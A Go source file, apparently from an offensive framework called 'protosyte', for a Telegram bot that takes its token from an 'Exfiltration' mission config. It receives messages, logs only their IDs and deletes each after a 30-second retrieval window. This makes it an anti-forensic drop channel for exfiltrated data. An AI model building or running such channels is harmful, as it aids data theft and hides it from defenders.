package main

import (
	"flag"
	"log"
	"os"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
	"protosyte.io/mission-config"
)

func main() {
	missionPath := flag.String("mission", "", "Path to mission.yaml (default: ./mission.yaml or ../mission.yaml)")
	flag.Parse()

	// Load mission configuration
	missionConfig, err := mission.LoadMissionConfig(*missionPath)
	if err != nil {
		log.Printf("[BROADCAST] Warning: Failed to load mission.yaml: %v (using environment variables)", err)
		missionConfig = nil
	} else if missionConfig != nil {
		log.Printf("[BROADCAST] Loaded mission: %s (ID: %s)", missionConfig.Mission.Name, missionConfig.Mission.ID)
	}

	// Get bot token from mission config or environment
	var botToken string
	if missionConfig != nil && missionConfig.Exfiltration.TelegramToken != "" {
		botToken = missionConfig.Exfiltration.TelegramToken
		log.Printf("[BROADCAST] Using bot token from mission.yaml")
	} else {
		botToken = os.Getenv("PROTOSYTE_BOT_TOKEN")
	}

	if botToken == "" {
		log.Fatal("PROTOSYTE_BOT_TOKEN not set in mission.yaml or PROTOSYTE_BOT_TOKEN environment variable")
	}

	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		log.Fatal(err)
	}

	bot.Debug = false

	u := tgbotapi.NewUpdate(0)
	u.Timeout = 60

	updates := bot.GetUpdatesChan(u)

	// Watchdog goroutine to monitor for unauthorized access
	go monitorAccess(bot)

	for update := range updates {
		if update.Message != nil {
			// Log only MessageID and timestamp, never content
			log.Printf("[INF] MsgID %d received at %v", update.Message.MessageID, time.Now())
			
			// Immediate deletion schedule
			go scheduleDeletion(bot, update.Message.Chat.ID, update.Message.MessageID)
		}
	}
}

func scheduleDeletion(bot *tgbotapi.BotAPI, chatID int64, msgID int) {
	// Allow for retrieval window (30 seconds)
	time.Sleep(30 * time.Second)
	
	_, err := bot.Send(tgbotapi.NewDeleteMessage(chatID, msgID))
	if err != nil {
		log.Printf("[ERR] Failed to delete message %d: %v", msgID, err)
	}
}

func monitorAccess(bot *tgbotapi.BotAPI) {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		config := tgbotapi.ChatAdministratorsConfig{
			ChatConfig: tgbotapi.ChatConfig{
				ChatID: bot.Self.ID,
			},
		}
		
		admins, err := bot.GetChatAdministrators(config)
		if err != nil {
			log.Printf("[WARN] Failed to check administrators: %v", err)
			continue
		}

		// Log administrator list for security monitoring
		log.Printf("[SEC] Current administrators: %d", len(admins))
	}
}

